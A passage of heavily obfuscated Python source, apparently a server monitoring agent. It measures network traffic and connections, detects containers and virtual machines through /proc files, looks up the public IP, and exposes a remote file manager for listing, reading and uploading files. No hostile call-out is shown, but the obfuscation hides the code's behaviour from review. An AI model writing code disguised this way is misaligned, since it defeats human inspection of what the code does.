            O0_var_216 = [codecs.decode('\\u006c\\u006f', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0062\\u0072\\u002d', 'unicode_escape'), codecs.decode('\\u0074\\u0075\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0069\\u0072\\u0062\\u0072', 'unicode_escape')]
            for O0_var_217, O0_var_218 in O0_var_212.items():
                if any((O0_var_219 in O0_var_217 for O0_var_219 in O0_var_216)):
                    continue
                O0_var_214 += O0_var_218.bytes_recv
                O0_var_215 += O0_var_218.bytes_sent
            if SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')] == 0:
                SystemInfoCollector._total_network_down = O0_var_214
                SystemInfoCollector._total_network_up = O0_var_215
                SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_214, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_215}
                SystemInfoCollector._last_network_time = O0_var_213
                return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
            O0_var_220 = O0_var_213 - SystemInfoCollector._last_network_time
            O0_var_221 = 0
            O0_var_222 = 0
            if O0_var_220 > 0:
                O0_var_222 = (O0_var_214 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')]) / O0_var_220
                O0_var_221 = (O0_var_215 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0074\\u0078', 'unicode_escape')]) / O0_var_220
                O0_var_222 = max(0, O0_var_222)
                O0_var_221 = max(0, O0_var_221)
                SystemInfoCollector._total_network_down = O0_var_214
                SystemInfoCollector._total_network_up = O0_var_215
            SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_214, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_215}
            SystemInfoCollector._last_network_time = O0_var_213
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): int(O0_var_221), codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): int(O0_var_222), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
        except Exception as e:
            Logger.debug(codecs.decode('\\u0070\\u0073\\u0075\\u0074\\u0069\\u006c\\u0020\\u6309\\u7f51\\u5361\\u7edf\\u8ba1\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 14)
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0}

    async def _get_tcp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_223 = await asyncio.to_thread(subprocess.run, [codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_224 for O0_var_224 in O0_var_223.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape') in O0_var_224])
            O0_var_225 = psutil.net_connections(kind=codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'))
            return len([O0_var_226 for O0_var_226 in O0_var_225 if O0_var_226.status == codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape')])
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0054\\u0043\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return 0

    async def _get_udp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_227 = await asyncio.to_thread(subprocess.run, [codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_228 for O0_var_228 in O0_var_227.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0055\\u0044\\u0050', 'unicode_escape') in O0_var_228 and O0_var_228.strip()])
            return len(psutil.net_connections(kind=codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')))
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0055\\u0044\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 12)
            return 0

    def _get_linux_distribution(self) -> Dict[str, str]:
        try:
            if platform.system() == codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape') and os.path.exists(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_229:
                    O0_var_230 = O0_var_229.read()
                O0_var_231, O0_var_232 = (codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'))
                for O0_var_233 in O0_var_230.split(codecs.decode('\\u000a', 'unicode_escape')):
                    if O0_var_233.startswith(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_231 = O0_var_233.replace(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
                    elif O0_var_233.startswith(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_232 = O0_var_233.replace(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
                return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_231, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_232}
        except Exception:
            pass
        return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')}

    def _get_virtualization(self) -> str:

        def try_read(O0_var_234: str) -> str:
            try:
                if os.path.exists(O0_var_234):
                    with open(O0_var_234, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0065', 'unicode_escape')) as O0_var_235:
                        return O0_var_235.read()
            except Exception:
                pass
            return codecs.decode('', 'unicode_escape')
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')
        try:
            if os.path.exists(codecs.decode('\\u002f\\u002f\\u002e\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            if os.path.exists(codecs.decode('\\u002f\\u0072\\u0075\\u006e\\u002f\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')
            O0_var_236 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape')).lower()
            if codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_236 or codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0064', 'unicode_escape') in O0_var_236:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u0070\\u006f\\u0064\\u0073', 'unicode_escape') in O0_var_236:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            elif codecs.decode('\\u006c\\u0078\\u0063', 'unicode_escape') in O0_var_236:
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_236 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0073\\u0065\\u006c\\u0066\\u002f\\u006d\\u006f\\u0075\\u006e\\u0074\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u002f\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0073\\u002f', 'unicode_escape') in O0_var_236 or codecs.decode('\\u0077\\u006f\\u0072\\u006b\\u0064\\u0069\\u0072\\u003d\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u0069\\u0062\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_236:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u002f\\u0070\\u006f\\u0064\\u0073\\u002f', 'unicode_escape') in O0_var_236 or codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u006c\\u0065\\u0074', 'unicode_escape') in O0_var_236:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            if codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u003d\\u006c\\u0078\\u0063', 'unicode_escape') in try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0065\\u006e\\u0076\\u0069\\u0072\\u006f\\u006e', 'unicode_escape')):
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_236 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape') in O0_var_236 or codecs.decode('\\u004b\\u0056\\u004d', 'unicode_escape') in O0_var_236:
                return codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape')
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u865a\\u62df\\u5316\\u4fe1\\u606f\\u5931\\u8d25\\u0028\\u975e\\u81f4\\u547d\\u0029\\u003a\\u0020', 'unicode_escape') + str(e), 11)
        return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')

    async def _get_public_ip_v4(self) -> Optional[str]:
        O0_var_237 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0063\\u0068\\u0065\\u0063\\u006b\\u0069\\u0070\\u002e\\u0061\\u006d\\u0061\\u007a\\u006f\\u006e\\u0061\\u0077\\u0073\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0066\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006d\\u0065\\u002f\\u0069\\u0070', 'unicode_escape')]
        for O0_var_238 in O0_var_237:
            try:
                O0_var_239 = await self._fetch_ip(O0_var_238)
                if O0_var_239 and self._is_valid_ipv4(O0_var_239):
                    return O0_var_239
            except Exception:
                continue
        return None

    async def _get_public_ip_v6(self) -> Optional[str]:
        O0_var_240 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u0036\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')]
        for O0_var_241 in O0_var_240:
            try:
                O0_var_242 = await self._fetch_ip(O0_var_241)
                if O0_var_242 and self._is_valid_ipv6(O0_var_242):
                    return O0_var_242
            except Exception:
                continue
        return None

    async def _fetch_ip(self, O0_var_243: str) -> str:
        O0_var_244 = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=O0_var_244) as O0_var_245:
            async with O0_var_245.get(O0_var_243, headers={codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): Config.AGENT_VERSION}) as response:
                if response.status == 200:
                    return (await response.text()).strip()
                raise Exception(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u0020', 'unicode_escape') + str(response.status))

    def _is_valid_ipv4(self, O0_var_246: str) -> bool:
        try:
            socket.inet_pton(socket.AF_INET, O0_var_246)
            return True
        except socket.error:
            return False

    def _is_valid_ipv6(self, O0_var_247: str) -> bool:
        try:
            socket.inet_pton(socket.AF_INET6, O0_var_247)
            return True
        except socket.error:
            return False
import shutil
import stat
import hashlib
import mimetypes
import base64
import json
import zipfile
from pathlib import Path, PurePosixPath
from datetime import datetime, timezone
from typing import List, Dict, Optional, Union
from fastapi import HTTPException, status, UploadFile
from croniter import croniter

class FileManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u6587\\u4ef6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u5c01\\u88c5\\u6240\\u6709\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u64cd\\u4f5c\\u000a\\u0020\\u0020\\u0020\\u0020\\u5b89\\u5168\\u7279\\u6027\\u003a\\u0020\\u8def\\u5f84\\u6821\\u9a8c\\u3001\\u6743\\u9650\\u68c0\\u67e5\\u3001\\u5ba1\\u8ba1\\u65e5\\u5fd7\\u3001\\u5206\\u5757\\u4e0a\\u4f20\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, root: str, max_upload: int=104857600, chunk_size: int=20971520, audit: bool=True):
        self.O0_fn_60 = Path(root).resolve()
        self.max_upload = max_upload
        self.chunk_size = chunk_size
        self.audit = audit
        self.chunk_dir = self.O0_fn_60 / codecs.decode('\\u002e\\u0070\\u0072\\u006f\\u0078\\u0079\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape')
        self.chunk_dir.mkdir(exist_ok=True)

    def _audit(self, O0_var_248: str, path: str, O0_var_249: str, O0_var_250: dict=None):
        if self.audit:
            O0_var_251 = {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat(), codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_248, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): path, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_249, **(O0_var_250 or {})}
            if os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
                Logger.debug(codecs.decode('\\U0001f4dd\\u0020\\u005b\\u0041\\u0055\\u0044\\u0049\\u0054\\u005d\\u0020', 'unicode_escape') + str(json.dumps(O0_var_251, ensure_ascii=False)))

    def _safe_path(self, O0_var_252: str) -> Path:
        O0_var_252 = (O0_var_252 or codecs.decode('\\u002e', 'unicode_escape')).strip()
        O0_var_253 = Path(O0_var_252)
        if not O0_var_253.is_absolute():
            O0_var_253 = self.O0_fn_60 / O0_var_253
        O0_var_253 = O0_var_253.resolve()
        try:
            O0_var_253.relative_to(self.O0_fn_60)
        except ValueError:
            raise HTTPException(status_code=403, detail=codecs.decode('\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_252) + codecs.decode('\\u0027\\u0020\\u006f\\u0075\\u0074\\u0073\\u0069\\u0064\\u0065\\u0020\\u0072\\u006f\\u006f\\u0074\\u0020\\u0027', 'unicode_escape') + str(self.O0_fn_60) + codecs.decode('\\u0027', 'unicode_escape'))
        return O0_var_253

    def _format_info(self, path: Path) -> dict:
        try:
            O0_var_254 = path.lstat() if path.is_symlink() else path.stat()
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path.relative_to(self.O0_fn_60)), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape') if path.is_dir() else codecs.decode('\\u0073\\u0079\\u006d\\u006c\\u0069\\u006e\\u006b', 'unicode_escape') if path.is_symlink() else codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_254.st_size, codecs.decode('\\u006d\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): datetime.fromtimestamp(O0_var_254.st_mtime).isoformat(), codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): stat.filemode(O0_var_254.st_mode), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_254.st_mode)), codecs.decode('\\u006f\\u0077\\u006e\\u0065\\u0072', 'unicode_escape'): str(O0_var_254.st_uid) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_254.st_gid)}
        except Exception as e:
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)}

    def list_files(self, base_path: str, recursive: bool=False) -> dict:
        O0_var_255 = self._safe_path(base_path)
        if not O0_var_255.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        if not O0_var_255.is_dir():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_256 = []
        try:
            O0_var_257 = O0_var_255.rglob(codecs.decode('\\u002a', 'unicode_escape')) if recursive else O0_var_255.iterdir()
            for O0_var_258 in O0_var_257:
                if not recursive and O0_var_258.parent != O0_var_255:
                    continue
                O0_var_256.append(self._format_info(O0_var_258))
        except PermissionError:
            raise HTTPException(403, codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_256.sort(key=lambda x: (x.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')) != codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape'), x.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower()))
        self._audit(codecs.decode('\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), base_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_256)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_256), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_256}

    def get_authority(self, O0_var_259: List[str]) -> dict:
        O0_var_260 = []
        for O0_var_261 in O0_var_259:
            try:
                O0_var_262 = self._safe_path(O0_var_261)
                if not O0_var_262.exists():
                    O0_var_260.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_261, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_263 = self._format_info(O0_var_262)
                O0_var_260.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_263[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_263[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')], codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_263.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape')), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_263.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape')), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): O0_var_263.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')), codecs.decode('\\u0072\\u0065\\u0061\\u0064\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_262, os.R_OK), codecs.decode('\\u0077\\u0072\\u0069\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_262, os.W_OK), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_262, os.X_OK)})
            except HTTPException as e:
                O0_var_260.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_261, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_260.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_261, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        self._audit(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), str(O0_var_259), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0069\\u0065\\u0064', 'unicode_escape'): len(O0_var_259)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_260}

    def cat_file(self, file_path: str, O0_var_264: int=1048576) -> dict:
        O0_var_265 = self._safe_path(file_path)
        if not O0_var_265.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_265.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if O0_var_265.stat().st_size > O0_var_264:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u0020\\u0066\\u006f\\u0072\\u0020\\u0063\\u0061\\u0074\\u0020\\u0028\\u003e\\u0031\\u004d\\u0042\\u0029\\u003a\\u0020', 'unicode_escape') + str(file_path))
        try:
            O0_var_266 = O0_var_265.read_text(encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
            O0_var_267 = codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')
            O0_var_268 = False
        except:
            O0_var_266 = base64.b64encode(O0_var_265.read_bytes()).decode()
            O0_var_267 = codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')
            O0_var_268 = True
        self._audit(codecs.decode('\\u0063\\u0061\\u0074', 'unicode_escape'), file_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_265.stat().st_size, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_267})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_265.relative_to(self.O0_fn_60)), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): O0_var_266, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_267, codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): O0_var_268, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_265.stat().st_size}

    def upload_file(self, file_content: bytes, target_path: str, filename: str=None, chunk_id: int=None, total_chunks: int=None) -> dict:
        O0_var_269 = self._safe_path(target_path)
        if O0_var_269.is_dir():
            if not filename:
